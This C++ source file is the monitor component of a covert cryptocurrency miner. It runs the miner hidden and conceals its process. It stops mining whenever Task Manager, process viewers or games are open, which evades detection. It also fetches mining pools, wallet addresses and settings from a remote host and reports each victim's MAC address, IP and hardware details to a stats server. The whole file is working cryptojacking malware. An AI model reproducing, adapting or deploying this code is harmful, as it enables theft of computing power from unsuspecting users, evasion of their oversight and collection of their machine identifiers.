/*
 * @文  件  名：XPMMonitor.cpp
 * @说      明：CMonitor实现
 * @日      期：Created on: 2014/03/03
 * @版      权：Copyright 2014
 * @作      者：MCA
 */

#include "StdAfx.h"
#include "ResTool.h"
#include "CxLog.h"
#include "CPUInfo.h"
#include <Shlwapi.h>
#include "HardInfo.h"
#include "HttpHelp.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <algorithm>
#include "md5.h"
#include "IPCModule.h"
#include "HideProc.h"
#include "Monitor.h"

#pragma comment(lib, "Psapi.lib")

#define RUN_STATUS_INIT		(1)
#define RUN_STATUS_RUN		(2)
#define RUN_STATUS_STOP		(3)

#define MINING_EXE			TEXT("cssrs.exe")
#define TASKMGR_PARH        TEXT("SYSTEM32\\TASKMGR.EXE")	// 任务管理器路径
#define MONITOR_INTERVAL	500								// 定时时间间隔500ms
#define MAX_FILELD_LENGTH   64                              // 最大的字段长度
#define MAX_DELAY_RUNTIME	6								// 矿机运行延时时间3s
#define MAX_DELAY_TIME		4								// 矿机运行、停止延时时间2s
#define TIEM_SECOND_1		(2)								// 1秒
#define TIME_SECOND_5		(5 * TIEM_SECOND_1)				// 5秒
#define TIEM_SECOND_20		(20 * TIEM_SECOND_1)			// 20秒
#define TIEM_SECOND_30		(30 * TIEM_SECOND_1)			// 30秒
#define TIME_MINUTE_1		(1*60*TIEM_SECOND_1)			// 1分钟

#define MD5SIG				TEXT("awangba.com")

#define LEOCONF_URL			_T("http://domain.52wblm.com/XtTow/Cloud/LeoCoin/conf.ini");
#define ATCCONF_URL			_T("http://domain.52wblm.com/XtTow/Cloud/AtCoin/conf.ini");

#define CONF_URL			LEOCONF_URL

// 用户信息
TCHAR g_szUserName[MAX_FILELD_LENGTH] =  { 0 };
TCHAR g_szUserId[MAX_FILELD_LENGTH]   =  { 0 };
TCHAR g_szMainUserName[MAX_FILELD_LENGTH]      =  { 0 };
vector<CString> g_vPools;

CONFIGINFO config;
 
BOOL CMonitor::SendRuningStatus(CString strUserType, DWORD dwErrCode)
{
	CString strUrl = TEXT("/stat/eda");
	CString body;

	body.Format(TEXT("pw=%s&id=%s&user=%s&type=%s&mac=%s&cpun=%d&cpux=%d&sysinfo=%s&ip=%s&worker=%d"),
		CMd5::GetSignature(MD5SIG),
		g_szUserId,
		g_szUserName,
		strUserType,
		m_strMac,
		m_dwCoreNum,
		m_dwThreadNum,
		CHardInfo::GetInstance().GetSysInfo(),
		m_strIP,
		dwErrCode
	);

	CString strRetData;

	return CHttpHelp::GetInstance().PostReq(strUrl, body, strRetData);
}

 /**
  * \brief  枚举进程管理器进程
  * \return 获取的返回值
  */
BOOL CMonitor::EnumTaskMgr()
{
	HANDLE procSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (procSnap == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	BOOL bIsFound = FALSE;
	PROCESSENTRY32 procEntry = { 0 };

	procEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL bRet = Process32First(procSnap, &procEntry);

	while (bRet) {
		// 任务管理器启动时
		if (!_tcscmp(procEntry.szExeFile, TEXT("taskmgr.exe"))) {
			bIsFound = TRUE;
			goto EXIT;
		}

		// 进程查看器搜索
		for(size_t i = 0; i < config.vProcList.size(); i++) {
			if (_tcsstr(procEntry.szExeFile, config.vProcList[i])) {
				bIsFound = TRUE;
				goto EXIT;
			}
		}

		// 游戏搜索
		if (m_dwCoreNum <= config.Game_MinCore) {
			for(size_t i = 0; i < config.vGameList.size(); i++) {
				if (_tcsstr(procEntry.szExeFile, config.vGameList[i])) {
					bIsFound = TRUE;
					goto EXIT;
				}
			}
		}

		// 特别CPU进一步处理
		if (m_dwCoreNum <= config.Cpu_MinCore) {
			for (size_t i = 0; i < config.vCpuGameList.size(); i++) {
				if (_tcsstr(procEntry.szExeFile, config.vCpuGameList[i])) {
					bIsFound = TRUE;
					goto EXIT;
				}
			}
		}
		
		bRet = Process32Next(procSnap, &procEntry);
	}

EXIT:
	CloseHandle(procSnap);

	return bIsFound;
}

 /**
  * \brief  启动矿机
  * \return 返回值
  */
BOOL CMonitor::StartWorker(CString &strWalletAddres)
{
	BOOL bRet;
	CString strPath;
	CString strFile;
	
	strPath = CUtility::GetInstance().GetCurrentPath();
	strFile = strPath + _T("\\") + config.vMining[m_dwMiningIndex].name;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	INT i = CUtility::GetInstance().GetRadomNum(config.vMining[m_dwMiningIndex].pools.size());
	CString strParam;
	strParam.Format(config.vMining[m_dwMiningIndex].cmd,
		strFile,
		config.vMining[m_dwMiningIndex].pools[i],
		strWalletAddres,
		m_dwCpus
	);

	bRet = CreateProcess(
		NULL,
		strParam.GetBuffer(),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (bRet) {
		LOG1(TEXT("%s"), strParam);
		m_hProcess = pi.hProcess;
		CHideProcModule::HideProcess(pi.dwProcessId, TEXT("mining"));
	}

	return TRUE;
}

 /**
  * \brief  停止矿机
  * \return 返回值
  */
BOOL CMonitor::StopWorker()
{
	return TerminateProcess(m_hProcess, 0);
}

 /**
  * \brief  矿机运行状态
  * \return 返回是否在正运行
  */
BOOL CMonitor::IsRun()
{
	if (!m_hProcess) {
		return FALSE;
	}

	DWORD dwCode = WaitForSingleObject(m_hProcess, 100);
	if (dwCode == WAIT_TIMEOUT) {
		return TRUE;
	}

	m_hProcess = NULL;

	return FALSE;
}

 /**
  * \brief  获取用户云计算配置文件url路径
  * \return 是否下载成功
  */
BOOL CMonitor::GetConfigUrl(CString &strOutUrl)
{
	//CString strHost = TONGJI_URL;
	//CString strUrl = TEXT("/eda/cpuConfig?u=");
	//strUrl += g_szUserName;

	//return CHttpHelp::GetInstance().GetReq(strHost, strUrl, strOutUrl);
	strOutUrl = CONF_URL;

	return TRUE;
}

/**
* \brief  下载用户云计算配置文件
* \return 是否下载成功
*/
BOOL CMonitor::DownloadConfFile(CString &strUrl, CString &strFileName)
{
	return CHttpHelp::GetInstance().FromUrlToFile(strUrl, strFileName);
}

 /**
  * \brief  下载矿池列表文件
  * \return 是否下载成功
  */
//BOOL CMonitor::GetPoolsList()
//{
//	CString strUrl = config.poolurl;
//	CString strHost = config.poolhost;
//
//	CString data;
//	if (!CHttpHelp::GetInstance().GetReq(strHost, strUrl, data)) {
//		return FALSE;
//	}
//
//	CUtility::GetInstance().SplitString(data, TEXT("\r\n"), g_vPools);
//
//	return TRUE;
//}

BOOL CMonitor::ReadConfigParam()
{
	config.UseCore = 0;
	config.ValidTime = 180;
	config.MonTime	 = 30;
	config.Max   = 96;
	config.Min   = 30;
	config.Cpu_MinCore = 2;
	config.Game_MinCore = 2;

	CString strUrl;
	if (!GetConfigUrl(strUrl)) {
		return FALSE;
	}

	CUtility& pUtility = CUtility::GetInstance();

	CString strFileName = CUtility::GetInstance().GetCurrentPath();
	strFileName += TEXT("\\cloudconf.ini");
	if (!DownloadConfFile(strUrl, strFileName)) {
		return FALSE;
	}

	CString strValue;
	CString strSection = TEXT("conf");
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("valid"), strValue)) {		// 有效时间 默认3小时
		config.ValidTime = StrToInt(strValue);
	}
		
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("hbeat"), strValue)) {		// 心跳时间 默认30分钟
		config.MonTime = StrToInt(strValue);
	}
	
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("cpumax"), strValue)) {		// 最大cpu使用率
		config.Max = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("cpumin"), strValue)) {		// 最小cpu使用率
		config.Min = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("mincore"), strValue)) {		// 运行云计算最小cpu内核数
		config.Cpu_MinCore = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("coins"), strValue)) {		// 运行云计算最小cpu内核数
		vector<CString> vCoins;
		pUtility.SplitString(strValue, TEXT("&"), vCoins);
		for (size_t i = 0; i < vCoins.size(); i++) {
			tMining m;
			pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("mining"), strValue);

			if (strValue[0] == _T('@')) {
				m.name = strValue.Mid(1);
				// 读取特定cpu型号的配置规则
				strSection = TEXT("cpulist");
				if (pUtility.GetKeyValue(strFileName, strSection, TEXT("cpus"), strValue)) {
					vector<CString> vCpus;
					pUtility.SplitString(strValue, TEXT("&"), vCpus);
					for (size_t i = 0; i < vCpus.size(); i++) {
						if (m_strCpuName.Find(vCpus[i]) != -1) {
							if (pUtility.GetKeyValue(strFileName, vCpus[i], TEXT("mincore"), strValue)) {
								config.Cpu_MinCore = StrToInt(strValue);
							}
							if (pUtility.GetKeyValue(strFileName, vCpus[i], TEXT("lists"), strValue)) {
								pUtility.SplitString(strValue, TEXT("&"), config.vCpuGameList);
							}

							pUtility.GetKeyValue(strFileName, vCpus[i], TEXT("mining"), m.name);
							break;
						}
					}
				}
			} else {
				m.name = strValue;
			}

			if (pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("pool"), strValue)) {
				pUtility.SplitString(strValue, _T("&"), m.pools);
			}
			if (pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("addr"), m.addr)) {
				if (m.addr == _T("null")) {
					GetWalletAddres(g_szUserName, m.addr);
				}
			}

			pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("cmd"), m.cmd);
			config.vMining.push_back(m);
		}
	}

	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("addr"), config.addr)) {		// 钱包地址
	//	return FALSE;
	//}

	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("mining"), config.mining)) {	// 矿机程序
	//	return FALSE;
	//}

	//strSection = TEXT("pool");			// 矿池配置
	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("host"), config.poolhost)) {		// 矿池列表文件主机地址
	//	return FALSE;
	//}

	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("url"), config.poolurl)) {		// 矿池列表文件url
	//	return FALSE;
	//}

	strSection = TEXT("sysproc");		// 系统进程
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("lists"), strValue)) {
		pUtility.SplitString(strValue, TEXT("&"), config.vProcList);
	}

	strSection = TEXT("gameproc");		// 游戏进程
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("mincore"), strValue)) {		// 运行游戏的最小合核数
		config.Game_MinCore = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("lists"), strValue)) {
		pUtility.SplitString(strValue, TEXT("&"), config.vGameList);
	}

	DeleteFile(strFileName);

	return TRUE;
}

BOOL CMonitor::GetUserInfo(LPTSTR lpCmdLine)
{
	CString strCmd = lpCmdLine;
	CString strVal;

	CUtility& pUtility = CUtility::GetInstance();
	if (!pUtility.GetKeyFormString(strCmd, TEXT("uname"), TEXT(" "), strVal)) {
		return FALSE;
	}
	_sntprintf_s(g_szMainUserName, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s"), strVal);
	
	if (!pUtility.GetKeyFormString(strCmd, TEXT("uid"), TEXT(" "), strVal)) {
		return FALSE;
	}
	_sntprintf_s(g_szUserId, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s"), strVal);

	if (!pUtility.GetKeyFormString(strCmd, TEXT("ip"), TEXT(" "), m_strIP)) {
		return FALSE;
	}

	vector<CString> vUserList;
	CString strUName = g_szMainUserName;
	pUtility.SplitString(strUName, TEXT("_"), vUserList);
	if (vUserList.size() == 2) {
		_sntprintf_s(g_szUserName, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s_%s"), vUserList[0], vUserList[1]);
	}
	else {
		_sntprintf_s(g_szUserName, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s"), g_szMainUserName);
	}

	return TRUE;
}

BOOL CMonitor::GetWalletAddres(LPTSTR szUserName, CString& strWalletAddres)
{
	CString strUrl = TEXT("/eda/address");

	DWORD dwOSBit;
	if (CUtility::GetInstance().Is64BitOS()) {
		dwOSBit = 64;
	} else {
		dwOSBit = 32;
	}

	CString body;
	body.Format(TEXT("type=cpu&version=cpu1.0&user=%s&son=%s&pw=%s&osbit=%d&client=1.0"),
		g_szMainUserName,
		g_szUserName,
		CMd5::GetSignature(TEXT("getEdaAddress.awangba.com")),
		dwOSBit
	);

	return CHttpHelp::GetInstance().PostReq(strUrl, body, strWalletAddres);
}

BOOL CMonitor::IsExit()
{
	if ((m_dwCoreNum < config.Cpu_MinCore) || (m_dwCpus == 0)) {
		return TRUE;
	}

	return FALSE;
}

BOOL CMonitor::GetSystemInfo()
{
	// 获取cpu信息
	CCPUInfo cpuinfo;
	m_strCpuName = cpuinfo.GetCPUName();
	m_dwCoreNum = cpuinfo.GetCPUNumbers();
	m_dwThreadNum = cpuinfo.GetCPUThreads();

	// 获取系统信息
	m_strMac = CHardInfo::GetInstance().GetMac();
	m_strSys = CHardInfo::GetInstance().GetSysInfo();

	return TRUE;
}

BOOL CMonitor::SetUseCoreCount()
{
	m_dwCpus = config.UseCore;

	if (m_dwCpus == 0) {
		if (m_dwCoreNum < 4) {
			m_dwCpus = 1;
		}
		else if ((m_dwCoreNum == 4) || (m_dwCoreNum == 6)) {
			m_dwCpus = 2;
		}
		else {
			m_dwCpus = m_dwCoreNum / 2;
		}
	}

	return TRUE;
}

 /**
  * \brief  开始监视
  * \return 返回值
  */
BOOL CMonitor::StartMonitor(LPTSTR lpCmdLine)
{
	DWORD dwPer = 0;
	BOOL  bIsSendValidData = FALSE;			// 两小时是否上报
	DWORD dwReportedTime = 0;				// 上报定时器
	DWORD dwValidHourTime   = 0;			// 有效计时器
	DWORD dwTime = 0;						// 定时器

	INT iWaitRun = 0;
	INT iWaitKill = 0;

	SYSTEMTIME tPrevTime;
	GetLocalTime(&tPrevTime);
	DWORD dwDay = tPrevTime.wDay;

	BOOL bTaskmgrRun = FALSE;
	LOG(lpCmdLine);
	BOOL bRet = GetUserInfo(lpCmdLine);
	if (!bRet) {
		return FALSE;
	}

	// 获取系统信息
	GetSystemInfo();
	ReadConfigParam();			// 读取网络配置参数
	SetUseCoreCount();			// 设置使用CPU的核心数
	if (IsExit()) {				// 判断是否退出
		return FALSE;
	}

	//bRet = GetPoolsList();		// 读取矿池列表
	//if (!bRet) {
	//	return FALSE;
	//}

	//CString strWallet;
	//do {
	//	bRet = GetWalletAddres(g_szUserName, strWallet);
	//	if (!bRet) {
	//		Sleep(300000);		// 延迟5分钟，再次请求
	//	}
	//} while(!bRet);

	SendRuningStatus(TEXT("eda0"), 0);
	DWORD dwCurRunStatus = RUN_STATUS_INIT;

	UINT_PTR s_MonitorTimerId = SetTimer(NULL, NULL, MONITOR_INTERVAL, NULL);	// 定时时间间隔500ms
	CCPUInfo cpu;
	while (1) {
		dwTime ++;
		if (dwTime >= TIME_MINUTE_1) {
			dwTime = 0;
			dwReportedTime  ++;
			dwValidHourTime ++;
		}

		// 读取CPU的使用率
		dwPer = cpu.GetCPUUseRate();
		bTaskmgrRun = EnumTaskMgr();

		if (dwPer <= config.Min) {
			if (iWaitRun < MAX_DELAY_RUNTIME) {
				iWaitRun ++;
			}
			
			iWaitKill = 0;
		} else {
			iWaitRun = 0;
		}

		if (dwPer > config.Max) {
			if (iWaitKill < MAX_DELAY_TIME) {
				iWaitKill ++;
			}

			iWaitRun = 0;
		} else {
			iWaitKill = 0;
		}
		LOG1(TEXT("use:%d"), dwPer);
		if ((iWaitRun >= MAX_DELAY_RUNTIME) && !bTaskmgrRun) {
			if (!IsRun()) {

				if ((m_dwMiningIndex < config.vMining.size() -1) && dwCurRunStatus == RUN_STATUS_RUN) {	// 切换矿机
					m_dwMiningIndex++;
					SendRuningStatus(TEXT("eda"), 5);
				}
				dwTime = 0;
				dwReportedTime  = 0;		// 定时器清0
				dwValidHourTime = 0;
				bRet = StartWorker(config.vMining[m_dwMiningIndex].addr);
				LOG(TEXT("StartWork"));
				if (bRet) {
					dwCurRunStatus = RUN_STATUS_RUN;
				}
			}
		} 
		
		if ((iWaitKill >= MAX_DELAY_TIME) || bTaskmgrRun) {
			if (IsRun()) {
				StopWorker();
				dwCurRunStatus = RUN_STATUS_STOP;
			}
		}

		// 运行时上报数据
		if (dwCurRunStatus == RUN_STATUS_RUN) {
			// 十分钟上报数据
			if (dwReportedTime >= config.MonTime) {
				dwReportedTime = 0;
				SendRuningStatus(TEXT("eda"), 0);

				SYSTEMTIME tt;
				GetLocalTime(&tt);
				if (dwDay != tt.wDay) {
					bIsSendValidData = FALSE;
					dwDay = tt.wDay;
					dwValidHourTime = 0;
				}
			}

			// 两小时上报数据
			if (!bIsSendValidData && (dwValidHourTime >= config.ValidTime)) {
				dwValidHourTime = 0;
				SendRuningStatus(TEXT("eda1"), 0);
				bIsSendValidData = TRUE;
			}
		}

		MSG msg;
		if (GetMessage (&msg, NULL, 0, 0)) {
			if (msg.message == WM_QUIT) {
				break;
			}

			TranslateMessage (&msg);
			DispatchMessage (&msg); 
		}
	}

	KillTimer(NULL, s_MonitorTimerId);

	return 0;
}